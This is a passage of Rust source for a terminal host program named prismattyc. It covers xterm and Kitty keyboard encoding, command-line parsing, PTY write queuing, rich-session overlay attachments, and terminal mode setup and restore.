        KeyCode::Right => Some(encode_csi_modified("1", b'C', key.modifiers)),
        KeyCode::Left => Some(encode_csi_modified("1", b'D', key.modifiers)),
        KeyCode::Home => Some(encode_csi_modified("1", b'H', key.modifiers)),
        KeyCode::End => Some(encode_csi_modified("1", b'F', key.modifiers)),
        KeyCode::PageUp => Some(encode_csi_modified("5", b'~', key.modifiers)),
        KeyCode::PageDown => Some(encode_csi_modified("6", b'~', key.modifiers)),
        KeyCode::Delete => Some(encode_csi_modified("3", b'~', key.modifiers)),
        KeyCode::Insert => Some(encode_csi_modified("2", b'~', key.modifiers)),
        // xterm F-key set (SS3 for plain F1–F4; CSI ~ for F5–F12).
        // Modified F-keys use CSI form with ;mod (even F1–F4): `\x1b[1;mod P`… /
        // `\x1b[15;mod ~` (remainder).
        KeyCode::F(n @ 1..=12) => encode_function_key(n, key.modifiers),
        _ => None,
    }
}

/// Kitty keyboard protocol encoding (progressive enhancement flags).
///
/// Spec: <https://sw.kovidgoyal.net/kitty/keyboard-protocol/>
fn encode_key_kitty(key: KeyEvent, flags: u16) -> Option<Vec<u8>> {
    use prismattyc_emulator::{
        KITTY_ALTERNATE_KEYS, KITTY_DISAMBIGUATE, KITTY_EVENT_TYPES, KITTY_REPORT_ALL,
        KITTY_REPORT_TEXT,
    };

    let disambiguate = flags & KITTY_DISAMBIGUATE != 0;
    let event_types = flags & KITTY_EVENT_TYPES != 0;
    let alternate_keys = flags & KITTY_ALTERNATE_KEYS != 0;
    let report_all = flags & KITTY_REPORT_ALL != 0;
    let report_text = flags & KITTY_REPORT_TEXT != 0;

    // report_all implies disambiguate for encoding purposes.
    let disambiguate = disambiguate || report_all;

    let event_type: u8 = match key.kind {
        KeyEventKind::Press => 1,
        KeyEventKind::Repeat => 2,
        KeyEventKind::Release => {
            if !event_types {
                return None;
            }
            3
        }
    };

    // Without report_all, Enter/Tab/Backspace keep legacy bytes (crash recovery).
    // Releases for those keys require report_all.
    let is_special_c0 = matches!(
        key.code,
        KeyCode::Enter | KeyCode::Tab | KeyCode::BackTab | KeyCode::Backspace
    );
    if key.kind == KeyEventKind::Release && is_special_c0 && !report_all {
        return None;
    }

    if !report_all && !disambiguate {
        // Only event-types / alt-keys / text without disambiguate: fall back
        // to legacy for key bytes; still may need event types on functional
        // forms — treat as legacy press encoding for simplicity.
        if key.kind == KeyEventKind::Release {
            return None;
        }
        return encode_key_legacy(key);
    }

    // --- report_all: everything as CSI u (or letter form for arrows) ---
    if report_all {
        return encode_key_kitty_report_all(
            key,
            event_type,
            event_types,
            alternate_keys,
            report_text,
        );
    }

    // --- disambiguate only (common: CSI > 1 u) ---
    encode_key_kitty_disambiguate(key, event_type, event_types, alternate_keys)
}

fn kitty_mod_field(modifiers: KeyModifiers, event_type: u8, event_types: bool) -> String {
    let mod_p = xterm_mod_param(modifiers);
    if event_types && event_type != 1 {
        format!("{mod_p}:{event_type}")
    } else if event_types && event_type == 1 {
        // Press is default; omit type subfield unless we want explicitness.
        // Spec: press default if absent — keep short form for presses.
        format!("{mod_p}")
    } else {
        format!("{mod_p}")
    }
}

/// CSI unicode ; mods u  (optional :shifted when alternate_keys + shift).
fn encode_csi_u(
    code: u32,
    modifiers: KeyModifiers,
    event_type: u8,
    event_types: bool,
    alternate_keys: bool,
    shifted: Option<u32>,
    text: Option<u32>,
) -> Vec<u8> {
    let mut key_field = code.to_string();
    if alternate_keys {
        if let Some(s) = shifted {
            if modifiers.contains(KeyModifiers::SHIFT) {
                key_field = format!("{code}:{s}");
            }
        }
    }
    let mod_field = kitty_mod_field(modifiers, event_type, event_types);
    if let Some(t) = text {
        format!("\x1b[{key_field};{mod_field};{t}u").into_bytes()
    } else if mod_field == "1" && !event_types {
        format!("\x1b[{key_field}u").into_bytes()
    } else {
        format!("\x1b[{key_field};{mod_field}u").into_bytes()
    }
}

fn encode_key_kitty_disambiguate(
    key: KeyEvent,
    event_type: u8,
    event_types: bool,
    alternate_keys: bool,
) -> Option<Vec<u8>> {
    // Releases: only report functional/disambiguated keys when event_types on.
    if key.kind == KeyEventKind::Release {
        return encode_key_kitty_functional_or_u(
            key,
            event_type,
            event_types,
            alternate_keys,
            false,
        );
    }

    match key.code {
        KeyCode::Esc => Some(encode_csi_u(
            27,
            key.modifiers,
            event_type,
            event_types,
            alternate_keys,
            None,
            None,
        )),
        KeyCode::Enter => Some(vec![b'\r']),
        KeyCode::Tab => {
            if key.modifiers.contains(KeyModifiers::SHIFT)
                || key.modifiers.contains(KeyModifiers::CONTROL)
                || key.modifiers.contains(KeyModifiers::ALT)
                || key.modifiers.contains(KeyModifiers::SUPER)
            {
                Some(encode_csi_u(
                    9,
                    key.modifiers,
                    event_type,
                    event_types,
                    alternate_keys,
                    None,
                    None,
                ))
            } else {
                Some(vec![b'\t'])
            }
        }
        KeyCode::BackTab => Some(encode_csi_u(
            9,
            key.modifiers | KeyModifiers::SHIFT,
            event_type,
            event_types,
            alternate_keys,
            None,
            None,
        )),
        KeyCode::Backspace => {
            if xterm_mod_param(key.modifiers) != 1 {
                Some(encode_csi_u(
                    127,
                    key.modifiers,
                    event_type,
                    event_types,
                    alternate_keys,
                    None,
                    None,
                ))
            } else {
                Some(vec![0x7f])
            }
        }
        KeyCode::Char(c) => encode_char_key_kitty_disambiguate(
            c,
            key.modifiers,
            event_type,
            event_types,
            alternate_keys,
        ),
        _ => encode_key_kitty_functional_or_u(key, event_type, event_types, alternate_keys, false),
    }
}

fn encode_char_key_kitty_disambiguate(
    c: char,
    modifiers: KeyModifiers,
    event_type: u8,
    event_types: bool,
    alternate_keys: bool,
) -> Option<Vec<u8>> {
    let ctrl = modifiers.contains(KeyModifiers::CONTROL);
    let alt = modifiers.contains(KeyModifiers::ALT);
    let shift = modifiers.contains(KeyModifiers::SHIFT);
    let super_key = modifiers.contains(KeyModifiers::SUPER);

    // Unshifted codepoint for CSI u (always lowercase for a-z when possible).
    let base = if c.is_ascii_alphabetic() {
        u32::from(c.to_ascii_lowercase())
    } else {
        u32::from(c)
    };
    let shifted = if c.is_ascii_alphabetic() {
        Some(u32::from(c.to_ascii_uppercase()))
    } else {
        None
    };

    // Disambiguate: any ctrl/alt/super (and ctrl+shift etc.) → CSI u.
    if ctrl || alt || super_key {
        return Some(encode_csi_u(
            base,
            modifiers,
            event_type,
            event_types,
            alternate_keys,
            shifted,
            None,
        ));
    }

    // Shift alone on printable: still text (legacy), unless we need CSI u.
    // Plain / shift text as UTF-8.
    if shift {
        return Some(c.to_string().into_bytes());
    }
    Some(c.to_string().into_bytes())
}

fn encode_key_kitty_report_all(
    key: KeyEvent,
    event_type: u8,
    event_types: bool,
    alternate_keys: bool,
    report_text: bool,
) -> Option<Vec<u8>> {
    match key.code {
        KeyCode::Esc => Some(encode_csi_u(
            27,
            key.modifiers,
            event_type,
            event_types,
            alternate_keys,
            None,
            None,
        )),
        KeyCode::Enter => Some(encode_csi_u(
            13,
            key.modifiers,
            event_type,
            event_types,
            alternate_keys,
            None,
            None,
        )),
        KeyCode::Tab | KeyCode::BackTab => {
            let mut mods = key.modifiers;
            if matches!(key.code, KeyCode::BackTab) {
                mods |= KeyModifiers::SHIFT;
            }
            Some(encode_csi_u(
                9,
                mods,
                event_type,
                event_types,
                alternate_keys,
                None,
                None,
            ))
        }
        KeyCode::Backspace => Some(encode_csi_u(
            127,
            key.modifiers,
            event_type,
            event_types,
            alternate_keys,
            None,
            None,
        )),
        KeyCode::Char(c) => {
            let base = if c.is_ascii_alphabetic() {
                u32::from(c.to_ascii_lowercase())
            } else {
                u32::from(c)
            };
            let shifted = if c.is_ascii_alphabetic() {
                Some(u32::from(c.to_ascii_uppercase()))
            } else {
                None
            };
            let text = if report_text && key.kind != KeyEventKind::Release {
                Some(u32::from(c))
            } else {
                None
            };
            Some(encode_csi_u(
                base,
                key.modifiers,
                event_type,
                event_types,
                alternate_keys,
                shifted,
                text,
            ))
        }
        _ => encode_key_kitty_functional_or_u(key, event_type, event_types, alternate_keys, true),
    }
}

/// Arrows / Home / End / Page / Insert / Delete / F-keys under Kitty mode.
fn encode_key_kitty_functional_or_u(
    key: KeyEvent,
    event_type: u8,
    event_types: bool,
    _alternate_keys: bool,
    _report_all: bool,
) -> Option<Vec<u8>> {
    let mod_field = kitty_mod_field(key.modifiers, event_type, event_types);
    let letter = |final_byte: u8| -> Vec<u8> {
        if mod_field == "1" && !event_types {
            // Plain: CSI A (omit 1)
            vec![0x1b, b'[', final_byte]
        } else {
            format!("\x1b[1;{mod_field}{}", final_byte as char).into_bytes()
        }
    };
    let tilde = |n: u16| -> Vec<u8> {
        if mod_field == "1" && !event_types {
            format!("\x1b[{n}~").into_bytes()
        } else {
            format!("\x1b[{n};{mod_field}~").into_bytes()
        }
    };

    match key.code {
        KeyCode::Up => Some(letter(b'A')),
        KeyCode::Down => Some(letter(b'B')),
        KeyCode::Right => Some(letter(b'C')),
        KeyCode::Left => Some(letter(b'D')),
        KeyCode::Home => Some(letter(b'H')),
        KeyCode::End => Some(letter(b'F')),
        KeyCode::PageUp => Some(tilde(5)),
        KeyCode::PageDown => Some(tilde(6)),
        KeyCode::Delete => Some(tilde(3)),
        KeyCode::Insert => Some(tilde(2)),
        KeyCode::F(n @ 1..=12) => {
            // Kitty prefers CSI 1;mod P form for F1–F4 when modified; with
            // report_all/disambiguate use CSI ~ numbers where standard.
            if mod_field == "1" && !event_types {
                encode_function_key(n, KeyModifiers::NONE)
            } else {
                match n {
                    1 => Some(format!("\x1b[1;{mod_field}P").into_bytes()),
                    2 => Some(format!("\x1b[1;{mod_field}Q").into_bytes()),
                    3 => Some(format!("\x1b[1;{mod_field}R").into_bytes()),
                    4 => Some(format!("\x1b[1;{mod_field}S").into_bytes()),
                    5 => Some(format!("\x1b[15;{mod_field}~").into_bytes()),
                    6 => Some(format!("\x1b[17;{mod_field}~").into_bytes()),
                    7 => Some(format!("\x1b[18;{mod_field}~").into_bytes()),
                    8 => Some(format!("\x1b[19;{mod_field}~").into_bytes()),
                    9 => Some(format!("\x1b[20;{mod_field}~").into_bytes()),
                    10 => Some(format!("\x1b[21;{mod_field}~").into_bytes()),
                    11 => Some(format!("\x1b[23;{mod_field}~").into_bytes()),
                    12 => Some(format!("\x1b[24;{mod_field}~").into_bytes()),
                    _ => None,
                }
            }
        }
        _ => None,
    }
}

/// Printable / modified character encoding (classic C0, ESC Meta, CSI 27).
fn encode_char_key(c: char, modifiers: KeyModifiers) -> Option<Vec<u8>> {
    let ctrl = modifiers.contains(KeyModifiers::CONTROL);
    let alt = modifiers.contains(KeyModifiers::ALT);
    let shift = modifiers.contains(KeyModifiers::SHIFT);
    let super_key = modifiers.contains(KeyModifiers::SUPER);

    // Traditional Ctrl+letter / Ctrl+Space (Shift and Super excluded).
    // Ctrl+Alt+letter still uses C0 (historic terminal Meta-ctrl often does).
    if ctrl && !super_key && !shift {
        let lower = c.to_ascii_lowercase();
        if lower.is_ascii_lowercase() {
            return Some(vec![(lower as u8) - b'a' + 1]);
        }
        if c == ' ' {
            return Some(vec![0]);
        }
        // Ctrl+digit / Ctrl+symbol → modifyOtherKeys CSI 27.
        return Some(encode_csi27_char(c, modifiers));
    }

    // Ctrl+Shift / Super combos → CSI 27 ; mod ; code ~
    if ctrl || super_key {
        return Some(encode_csi27_char(c, modifiers));
    }

    // Alt+char (Meta): ESC then UTF-8 (readline Meta-b style).
    if alt {
        let mut out = vec![0x1b];
        out.extend(c.to_string().into_bytes());
        return Some(out);
    }

    // Plain (or Shift-only: crossterm already supplies the shifted glyph).
    Some(c.to_string().into_bytes())
}

fn encode_function_key(n: u8, modifiers: KeyModifiers) -> Option<Vec<u8>> {
    let mod_p = xterm_mod_param(modifiers);
    if mod_p == 1 {
        return match n {
            1 => Some(b"\x1bOP".to_vec()),
            2 => Some(b"\x1bOQ".to_vec()),
            3 => Some(b"\x1bOR".to_vec()),
            4 => Some(b"\x1bOS".to_vec()),
            5 => Some(b"\x1b[15~".to_vec()),
            6 => Some(b"\x1b[17~".to_vec()),
            7 => Some(b"\x1b[18~".to_vec()),
            8 => Some(b"\x1b[19~".to_vec()),
            9 => Some(b"\x1b[20~".to_vec()),
            10 => Some(b"\x1b[21~".to_vec()),
            11 => Some(b"\x1b[23~".to_vec()),
            12 => Some(b"\x1b[24~".to_vec()),
            _ => None,
        };
    }
    // Modified: F1–F4 as CSI 1;mod P/Q/R/S; F5–F12 as CSI n;mod ~
    match n {
        1 => Some(format!("\x1b[1;{mod_p}P").into_bytes()),
        2 => Some(format!("\x1b[1;{mod_p}Q").into_bytes()),
        3 => Some(format!("\x1b[1;{mod_p}R").into_bytes()),
        4 => Some(format!("\x1b[1;{mod_p}S").into_bytes()),
        5 => Some(format!("\x1b[15;{mod_p}~").into_bytes()),
        6 => Some(format!("\x1b[17;{mod_p}~").into_bytes()),
        7 => Some(format!("\x1b[18;{mod_p}~").into_bytes()),
        8 => Some(format!("\x1b[19;{mod_p}~").into_bytes()),
        9 => Some(format!("\x1b[20;{mod_p}~").into_bytes()),
        10 => Some(format!("\x1b[21;{mod_p}~").into_bytes()),
        11 => Some(format!("\x1b[23;{mod_p}~").into_bytes()),
        12 => Some(format!("\x1b[24;{mod_p}~").into_bytes()),
        _ => None,
    }
}

struct Cli {
    experimental_rich: bool,
    no_splash: bool,
    /// True when PROGRAM came from argv rather than the $SHELL default.
    explicit_program: bool,
    program: String,
    child_args: Vec<std::ffi::OsString>,
}

fn print_help() {
    println!(
        "\
prismattyc {version} - Prismattyc classic host: run a program in a PTY

USAGE:
    prismattyc [OPTIONS] [PROGRAM [ARGS...]]
    prismattyc [OPTIONS] -- PROGRAM [ARGS...]

    With no PROGRAM, prismattyc launches $SHELL (falling back to /bin/sh).
    Use `--` to run a PROGRAM whose name starts with `-`.

OPTIONS:
    --experimental-rich    Enable the experimental rich client.
    --no-splash            Skip the launch splash screen (PRISMATTYC_NO_SPLASH=1 also works).
    -h, --help             Print this help and exit.
    -V, --version          Print version and exit.",
        version = env!("CARGO_PKG_VERSION")
    );
}

impl Cli {
    fn parse(args: impl IntoIterator<Item = std::ffi::OsString>) -> Result<Self> {
        let mut experimental_rich = env_flag_enabled("PRISMATTYC_EXPERIMENTAL_RICH");
        let mut no_splash = env_flag_enabled("PRISMATTYC_NO_SPLASH");
        let mut program = None;
        let mut child_args = Vec::new();
        let mut saw_separator = false;

        for arg in args {
            if !saw_separator {
                if arg == "--version" || arg == "-V" {
                    // First line is `<name> <version>` so help2man can parse it.
                    println!("{}", prismattyc_core::bin_version("prismattyc"));
                    std::process::exit(0);
                }
                if arg == "--help" || arg == "-h" {
                    print_help();
                    std::process::exit(0);
                }
                if arg == "--experimental-rich" {
                    experimental_rich = true;
                    continue;
                }
                if arg == "--no-splash" {
                    no_splash = true;
                    continue;
                }
                if arg == "--" {
                    // End of host flags; the next token is still the child program
                    // (not a shell script path). Without this, `prism -- /usr/bin/printf X`
                    // defaulted program to $SHELL and passed printf as a script arg
                    // → "cannot execute binary file".
                    saw_separator = true;
                    continue;
                }
            }
            if program.is_none() {
                program = Some(
                    arg.to_str()
                        .context("the child program path is not valid UTF-8")?
                        .to_owned(),
                );
                continue;
            }
            child_args.push(arg);
        }

        let explicit_program = program.is_some();
        let program = program.unwrap_or_else(|| prismattyc_mux::platform::default_shell());

        Ok(Self {
            experimental_rich,
            no_splash,
            explicit_program,
            program,
            child_args,
        })
    }
}

fn env_flag_enabled(name: &str) -> bool {
    match env::var(name) {
        Ok(value) => matches!(
            value.to_ascii_lowercase().as_str(),
            "1" | "true" | "yes" | "on"
        ),
        Err(_) => false,
    }
}

/// Like [`env_flag_enabled`], but **on** when unset (opt-out config).
fn env_flag_enabled_default_true(name: &str) -> bool {
    match env::var(name) {
        Ok(value) => !matches!(
            value.to_ascii_lowercase().as_str(),
            "0" | "false" | "no" | "off"
        ),
        Err(_) => true,
    }
}

/// Bytes for the child PTY writer thread (keys, paste, DSR, capability replies).
#[derive(Debug, Clone, PartialEq, Eq)]
struct ChildWrite {
    bytes: Vec<u8>,
    /// When set, applied to [`RichSession::granted`] only after a successful PTY
    /// write — not merely after enqueue.
    capability_grant: Option<CapabilityGrant>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct CapabilityGrant {
    features: BTreeSet<Feature>,
    region_limit: usize,
}

impl ChildWrite {
    fn bytes(bytes: Vec<u8>) -> Self {
        Self {
            bytes,
            capability_grant: None,
        }
    }

    fn capability(bytes: Vec<u8>, grant: CapabilityGrant) -> Self {
        Self {
            bytes,
            capability_grant: Some(grant),
        }
    }
}

impl From<Vec<u8>> for ChildWrite {
    fn from(bytes: Vec<u8>) -> Self {
        Self::bytes(bytes)
    }
}

impl std::ops::Deref for ChildWrite {
    type Target = [u8];
    fn deref(&self) -> &[u8] {
        &self.bytes
    }
}

impl PartialEq<[u8]> for ChildWrite {
    fn eq(&self, other: &[u8]) -> bool {
        self.bytes == other
    }
}

impl PartialEq<Vec<u8>> for ChildWrite {
    fn eq(&self, other: &Vec<u8>) -> bool {
        &self.bytes == other
    }
}

impl PartialEq<&[u8]> for ChildWrite {
    fn eq(&self, other: &&[u8]) -> bool {
        self.bytes == *other
    }
}

impl<const N: usize> PartialEq<&[u8; N]> for ChildWrite {
    fn eq(&self, other: &&[u8; N]) -> bool {
        self.bytes.as_slice() == other.as_slice()
    }
}

/// Host-side experimental rich session state (negotiation + attachments).
#[derive(Debug, Default)]
struct RichSession {
    /// Features successfully written to the child as a capability reply.
    granted: BTreeSet<Feature>,
    region_limit: usize,
    attachments: BTreeMap<u32, HostAttachment>,
    last_scrolled_lines: u64,
}

impl RichSession {
    fn apply_grant(&mut self, grant: CapabilityGrant) {
        self.granted = grant.features;
        self.region_limit = grant.region_limit;
    }

    fn can_insert(&self, id: u32) -> bool {
        self.attachments.contains_key(&id) || self.attachments.len() < self.region_limit
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum AttachKind {
    CellRect,
    Viewport,
}

/// Attachment stored with a signed row (cell-rect translates; viewport does not).
#[derive(Debug, Clone, PartialEq, Eq)]
struct HostAttachment {
    kind: AttachKind,
    row: i32,
    col: u16,
    rows: u16,
    cols: u16,
    text: String,
    runs: Vec<StyledRun>,
}

/// Forward emulator side-channel replies (DSR/CPR) to the child PTY writer queue.
fn drain_emulator_replies(emulator: &mut Emulator, to_child: &mpsc::SyncSender<ChildWrite>) {
    for reply in emulator.take_pending_replies() {
        let _ = to_child.try_send(ChildWrite::bytes(reply));
    }
}

/// Feed child output, preserving scroll-vs-APC order inside one PTY chunk.
///
/// Plain-text floods (no ESC, collector idle) are fed as a single slice so
/// `--experimental-rich` cannot stall the event loop. Control-bearing
/// slices still split on ESC so a completed APC and a grid scroll cannot share
/// one `feed`.
fn process_rich_chunk(
    emulator: &mut Emulator,
    rich: &mut RichSession,
    to_child: &mpsc::SyncSender<ChildWrite>,
    bytes: &[u8],
) {
    let mut index = 0;
    while index < bytes.len() {
        let end = if emulator.apc_pending() || bytes[index] == 0x1b {
            index + 1
        } else {
            bytes[index..]
                .iter()
                .position(|&b| b == 0x1b)
                .map_or(bytes.len(), |rel| index + rel)
        };
        let slice = &bytes[index..end];
        let before = emulator.screen().scrolled_lines();
        let events = emulator.feed(slice);
        drain_emulator_replies(emulator, to_child);
        let after = emulator.screen().scrolled_lines();
        if after > before {
            translate_attachments_for_scroll(rich, after);
        }
        if !events.is_empty() {
            handle_control_events(&events, rich, to_child);
        }
        index = end;
    }
}

fn handle_control_events(
    events: &[CollectedApc],
    rich: &mut RichSession,
    to_child: &mpsc::SyncSender<ChildWrite>,
) {
    for event in events {
        match event {
            CollectedApc::Discarded => {}
            CollectedApc::Body(body) => match decode_body(body) {
                Ok(ControlMessage::CapabilityQuery(query)) => {
                    if let Some(reply) = CapabilityReply::for_v1_query(query) {
                        if let Ok(bytes) = encode_capability_reply(&reply) {
                            let region_limit = if reply.limits.is_empty() {
                                MAX_CELL_RECT_ATTACHMENTS
                            } else {
                                reply
                                    .limits
                                    .get(LIMIT_REGIONS)
                                    .copied()
                                    .unwrap_or(DEFAULT_LIMIT_REGIONS)
                                    as usize
                            };
                            let grant = CapabilityGrant {
                                features: reply.features.clone(),
                                region_limit,
                            };
                            let _ = to_child.try_send(ChildWrite::capability(bytes, grant));
                        }
                    }
                }
                Ok(ControlMessage::AttachCellRect(attach)) => {
                    insert_attachment(
                        rich,
                        Feature::HybridAttachCellRect,
                        HostAttachment {
                            kind: AttachKind::CellRect,
                            row: i32::from(attach.row),
                            col: attach.col,
                            rows: attach.rows,
                            cols: attach.cols,
                            text: attach.text,
                            runs: Vec::new(),
                        },
                        attach.id,
                    );
                }
                Ok(ControlMessage::AttachViewport(attach)) => {
                    insert_attachment(
                        rich,
                        Feature::HybridOverlayViewport,
                        HostAttachment {
                            kind: AttachKind::Viewport,
                            row: i32::from(attach.row),
                            col: attach.col,
                            rows: attach.rows,
                            cols: attach.cols,
                            text: attach.text,
                            runs: attach.runs,
                        },
                        attach.id,
                    );
                }
                Ok(ControlMessage::AttachStyled(attach)) => {
                    let (kind, feature) = match attach.kind {
                        RegionKind::CellRect => {
                            (AttachKind::CellRect, Feature::HybridAttachCellRect)
                        }
                        RegionKind::Viewport => {
                            (AttachKind::Viewport, Feature::HybridOverlayViewport)
                        }
                    };
                    insert_attachment(
                        rich,
                        feature,
                        HostAttachment {
                            kind,
                            row: i32::from(attach.row),
                            col: attach.col,
                            rows: attach.rows,
                            cols: attach.cols,
                            text: String::new(),
                            runs: attach.runs,
                        },
                        attach.id,
                    );
                }
                Ok(ControlMessage::Update(update)) => {
                    let Some(existing) = rich.attachments.get_mut(&update.id) else {
                        continue;
                    };
                    let feature = match existing.kind {
                        AttachKind::CellRect => Feature::HybridAttachCellRect,
                        AttachKind::Viewport => Feature::HybridOverlayViewport,
                    };
                    if !rich.granted.contains(&feature) {
                        continue;
                    }
                    existing.text = update.text;
                    existing.runs = update.runs;
                }
                Ok(ControlMessage::Detach { id }) => {
                    rich.attachments.remove(&id);
                }
                Ok(ControlMessage::FocusQuery { .. })
                | Ok(ControlMessage::FocusReply { .. })
                | Ok(ControlMessage::FocusKey { .. })
                | Ok(ControlMessage::InputEvent(_))
                | Ok(ControlMessage::WorkspaceSnapshot(_))
                | Ok(ControlMessage::WorkspaceDrop { .. })
                | Ok(ControlMessage::CollectionSnapshot(_))
                | Ok(ControlMessage::CollectionPatch(_))
                | Ok(ControlMessage::CollectionDrop { .. })
                | Ok(ControlMessage::CollectionAck { .. })
                | Ok(ControlMessage::CollectionReject { .. })
                | Ok(ControlMessage::CollectionResnapshot { .. })
                | Ok(ControlMessage::CapabilityReply(_))
                | Ok(ControlMessage::SemanticSnapshot(_))
                | Ok(ControlMessage::SemanticCopy(_))
                | Ok(ControlMessage::StatusSnapshot(_))
                | Ok(ControlMessage::StatusDrop { .. })
                | Err(_) => {}
            },
        }
    }
}

/// Translate cell-rect attachments with primary-grid scroll; detach when fully
/// outside the visible viewport (hybrid scroll contract).
fn translate_attachments_for_scroll(rich: &mut RichSession, scrolled_lines: u64) {
    if scrolled_lines <= rich.last_scrolled_lines {
        rich.last_scrolled_lines = scrolled_lines;
        return;
    }
    let delta = scrolled_lines - rich.last_scrolled_lines;
    rich.last_scrolled_lines = scrolled_lines;
    let delta_i = i32::try_from(delta).unwrap_or(i32::MAX);
    rich.attachments.retain(|_, attach| {
        if attach.kind == AttachKind::Viewport {
            return true;
        }
        attach.row = attach.row.saturating_sub(delta_i);
        let height = i32::from(attach.rows);
        attach.row.saturating_add(height) > 0
    });
}

fn insert_attachment(rich: &mut RichSession, feature: Feature, attach: HostAttachment, id: u32) {
    if !rich.granted.contains(&feature) {
        return;
    }
    if !rich.can_insert(id) {
        return;
    }
    rich.attachments.insert(id, attach);
}

fn overlay_from(attach: &HostAttachment) -> CellRectOverlay {
    CellRectOverlay {
        row: attach.row,
        col: usize::from(attach.col),
        rows: usize::from(attach.rows).max(1),
        cols: usize::from(attach.cols).max(1),
        text: attach.text.clone(),
        runs: attach
            .runs
            .iter()
            .map(|run| OverlayRun {
                text: run.text.clone(),
                fg: run.fg,
                bg: run.bg,
                bold: run.bold,
                italic: run.italic,
                underline: run.underline,
                inverse: run.inverse,
            })
            .collect(),
    }
}

fn overlays_from(
    attachments: &BTreeMap<u32, HostAttachment>,
    screen_rows: usize,
) -> Vec<CellRectOverlay> {
    let screen_rows_i = i32::try_from(screen_rows).unwrap_or(i32::MAX);
    let mut cell_rect = Vec::new();
    let mut viewport = Vec::new();
    for attach in attachments.values() {
        if attach.row >= screen_rows_i {
            continue;
        }
        let overlay = overlay_from(attach);
        match attach.kind {
            AttachKind::CellRect => cell_rect.push(overlay),
            AttachKind::Viewport => viewport.push(overlay),
        }
    }
    cell_rect.extend(viewport);
    cell_rect
}

fn usable_terminal_size((columns, rows): (u16, u16)) -> (u16, u16) {
    let columns = if columns == 0 {
        80
    } else {
        columns.min(MAX_TERM_COLS)
    };
    let rows = if rows == 0 {
        24
    } else {
        rows.min(MAX_TERM_ROWS)
    };
    (columns, rows)
}

/// Record a clean child exit (empty EOF / channel disconnect).
/// Never overwrites a sticky PTY read error with success.
fn note_clean_child_exit(pending: &mut Option<Option<io::Error>>) {
    if pending.is_none() {
        *pending = Some(None);
    }
}

/// Record a PTY read error. First error wins; subsequent signals do not replace.
fn note_child_read_error(pending: &mut Option<Option<io::Error>>, error: io::Error) {
    if pending.is_none() {
        *pending = Some(Some(error));
    }
}

/// Fail-closed host resize helper (matrix F3): mutate grid only after PTY ok.
fn apply_host_resize_fail_closed(
    pty_resize: impl FnOnce() -> Result<()>,
    on_ok: impl FnOnce(),
) -> bool {
    if pty_resize().is_ok() {
        on_ok();
        true
    } else {
        // fail-closed already skips grid mutation; give the user a
        // visible cue (same BEL as paste enqueue failure) so host vs grid skew
        // is not completely silent.
        signal_child_enqueue_failure();
        false
    }
}

/// Stepwise host enter (alt/hide/mouse/bracketed-paste/keyboard). On any failure,
/// best-effort full leave rollback on the same writer.
fn enter_host_modes<W: Write>(out: &mut W) -> io::Result<()> {
    if let Err(error) = execute!(out, EnterAlternateScreen) {
        leave_host_modes_best_effort(out);
        return Err(error);
    }
    if let Err(error) = execute!(out, Hide) {
        leave_host_modes_best_effort(out);
        return Err(error);
    }
    if let Err(error) = execute!(out, crossterm::event::EnableMouseCapture) {
        leave_host_modes_best_effort(out);
        return Err(error);
    }
    // So Ghostty/etc. deliver Event::Paste instead of raw key floods.
    if let Err(error) = execute!(out, EnableBracketedPaste) {
        leave_host_modes_best_effort(out);
        return Err(error);
    }
    // Focus in/out for DECSET 1004 (CSI I / CSI O to child when enabled).
    if let Err(error) = execute!(out, crossterm::event::EnableFocusChange) {
        leave_host_modes_best_effort(out);
        return Err(error);
    }
    // Kitty keyboard protocol: ask for disambiguated modified keys so Shift+arrow
    // reports SHIFT. Best-effort — hosts without support ignore the CSI.
    // (Avoid REPORT_ALL_KEYS_AS_ESCAPE_CODES; it breaks plain typing on some builds.)
    let _ = execute!(
        out,
        PushKeyboardEnhancementFlags(
            KeyboardEnhancementFlags::DISAMBIGUATE_ESCAPE_CODES
                | KeyboardEnhancementFlags::REPORT_EVENT_TYPES
        )
    );
    Ok(())
}

fn leave_host_modes_best_effort<W: Write>(out: &mut W) {
    let _ = execute!(
        out,
        PopKeyboardEnhancementFlags,
        crossterm::event::DisableFocusChange,
        DisableBracketedPaste,
        crossterm::event::DisableMouseCapture,
        Show,
        LeaveAlternateScreen
    );
}

/// Returns whether this call should perform host leave + disable-raw side effects.
/// First true→false transition wins; further calls are no-ops (double-restore safe).
fn take_host_terminal_ownership(owned: &AtomicBool) -> bool {
    owned.swap(false, Ordering::SeqCst)
}

/// Best-effort outer TTY restore. Idempotent across Drop and any future paths.
fn restore_host_terminal_once() {
    if !take_host_terminal_ownership(&HOST_TERMINAL_OWNED) {
        return;
    }
    leave_host_modes_best_effort(&mut io::stdout());
    let _ = disable_raw_mode();
}

fn signal_exit_requested() -> bool {
    SIGNAL_REQUESTED_EXIT.load(Ordering::SeqCst)
}

/// Wait up to `timeout_ms` for host input, returning `true` if the host input
/// terminal (stdin) hung up instead.
///
/// A nested prism inherits a PTY with no controlling terminal, so a master
/// close raises `POLLHUP` on the slave but delivers no `SIGHUP`. crossterm's
/// own `event::poll` cannot escape this: it reports the EOF'd fd perpetually
/// ready and `event::read` returns nothing, so the loop free-runs at 100% CPU
/// and leaks an orphaned process. We therefore own the readiness wait on the
/// exact fd crossterm reads — `STDIN_FILENO`, which crossterm selects whenever
/// `isatty(0)` (always true here; prism requires a terminal on stdin).
///
/// `POLLHUP`/`POLLERR`/`POLLNVAL` are output-only conditions. POSIX reports them
/// regardless of `events`, but macOS/BSD only surface `POLLHUP` when `POLLIN` is
/// requested, so we ask for `POLLIN` and inspect only the hangup bits (a lone
/// `POLLIN` is real input, not a hangup). A poll error is treated as "not hung
/// up" so a transient failure never tears down a live session; the caller then
/// lets crossterm read as before.
#[cfg(unix)]
fn wait_host_input_hangup(timeout_ms: i32) -> bool {
    use std::os::fd::AsRawFd;
    let mut pfd = libc::pollfd {
        fd: io::stdin().as_raw_fd(),
        events: libc::POLLIN,
        revents: 0,
    };
    // SAFETY: single valid pollfd, count 1; blocks up to timeout_ms.
    let ready = unsafe { libc::poll(&mut pfd, 1, timeout_ms) };
    ready > 0 && (pfd.revents & (libc::POLLHUP | libc::POLLERR | libc::POLLNVAL)) != 0
}

#[cfg(not(unix))]
fn wait_host_input_hangup(timeout_ms: i32) -> bool {
    // No hangup detection off Unix; approximate crossterm's poll wait.
    std::thread::sleep(Duration::from_millis(timeout_ms.max(0) as u64));
    false
}

